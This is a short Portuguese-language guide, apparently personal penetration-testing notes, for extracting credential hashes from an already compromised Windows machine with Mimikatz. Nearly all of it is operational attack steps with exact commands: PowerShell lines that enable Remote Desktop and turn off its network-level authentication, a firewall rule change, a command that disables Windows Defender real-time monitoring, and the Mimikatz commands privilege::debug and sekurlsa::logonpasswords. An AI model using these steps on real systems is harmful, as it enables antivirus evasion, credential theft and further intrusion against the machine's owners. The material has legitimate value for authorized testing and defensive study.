O MIMIKATZ É UMA FERRAMENTA QUE VOCÊ RODA DENTRO DO WINDOWS COMPROMETIDO
E EXTRAI AS HASHINGS DA MEMÓRIA, MAS POR SER UMA FERRAMENTA COM INTERFACE
VOCÊ PRECISA RODAR ELA PELO REMOTE DESKTOP.
	
	1.CASO O REMOTE DESKTOP ESTEJA DESATIVADO, VOCÊ PODE
	ACESSAR O IP COM O EVIL-WINRM E HABILITAR O REMOTE
	DESKTOP PELO POWERSHELL E HABILITAR ELE NO FIREWALL.
		
		COMANDOS: (Get-WmiObject -Class 'Win32_TerminalServiceSetting' -Namespace 'root\cimv2\TerminalServices').SetAllowTsConnections(1,1)
		
		(Get-WmiObject -Class 'Win32_TSGeneralSetting' -Namespace 'root\cimv2\TerminalServices' -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
		
		COMANDO PARA HABILITAR O REMOTE DESKTOP PELO FIREWALL: 
			
			Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
			
	2.APÓS ISSO SE CONECTE AO REMOTE DESKTOP COM O CLIPBOARD HABILITADO.
	
	3.PESQUISE PELO MIMIKATZ NAS PESQUISAS DO KALI E MOVA OS ARQUIVOS
	DO MIMIKATZ DE ACORDO COM OS BITS DO COMPUTADOR ALVO PARA O REMOTE DESKTOP.
	
	4.DESABILITE O MONITORAMENTO DO WINDOWS EM TEMPO REAL PELO POWERSHELL.
		
		COMANDO: Set-MpPreference -DisableRealTimeMonitoring $true
		
	5.EXECUTE O MIMIKATZ PELO POWERSHELL.
		
		COMANDO: ./mimikatz.exe
		
	6.VERIFIQUE SE TEM PERMISSÃO DE USAR O DEBUG.
		
		COMANDO: privilege::debug
		
	7.EXTRAIR AS HASHS.
		
		COMANDO: sekurlsa::logonpasswords
	
	8.APÓS ISSO IRÁ APARECER TODAS AS HASHINGS, USUÁRIOS ETC...
